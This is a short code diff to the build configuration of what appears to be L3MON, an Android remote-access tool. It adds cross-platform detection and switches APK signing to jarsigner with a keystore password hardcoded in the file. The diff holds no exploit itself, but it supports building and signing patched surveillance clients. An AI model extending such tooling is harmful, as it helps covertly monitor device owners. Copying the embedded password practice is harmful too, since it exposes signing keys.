@@ -17,8 +17,22 @@ exports.apkSign = path.join(__dirname, '../app/factory/', 'sign.jar');
 exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
 exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/etechd/l3mon/IOSocket.smali');
 
-exports.buildCommand = 'proot java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
-exports.signCommand = 'proot java -jar "' + exports.apkSign + '" "' + exports.apkBuildPath + '"'; // <-- fix output
+// Keystore for jarsigner signing (cross-platform)
+exports.keystorePath = path.join(__dirname, '../app/factory/', 'l3mon.jks');
+exports.keystorePass = 'l3mon123';
+exports.keystoreAlias = 'testkey';
+
+// Cross-platform detection
+const os = require('os');
+const isTermux = !!process.env.TERMUX_VERSION || (process.platform === 'linux' && os.homedir().includes('/data/data/com.termux'));
+const isWindows = process.platform === 'win32';
+const javaBin = isTermux ? 'proot java' : 'java';
+const jarsignerBin = isTermux ? 'jarsigner' : (isWindows ? 'jarsigner' : 'jarsigner');
+
+exports.platform = { isTermux, isWindows };
+
+exports.buildCommand = javaBin + ' -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
+exports.signCommand = jarsignerBin + ' -keystore "' + exports.keystorePath + '" -storepass ' + exports.keystorePass + ' -keypass ' + exports.keystorePass + ' -signedjar "' + exports.apkSignedBuildPath + '" "' + exports.apkBuildPath + '" ' + exports.keystoreAlias;
 
 exports.messageKeys = {
     camera: '0xCA',
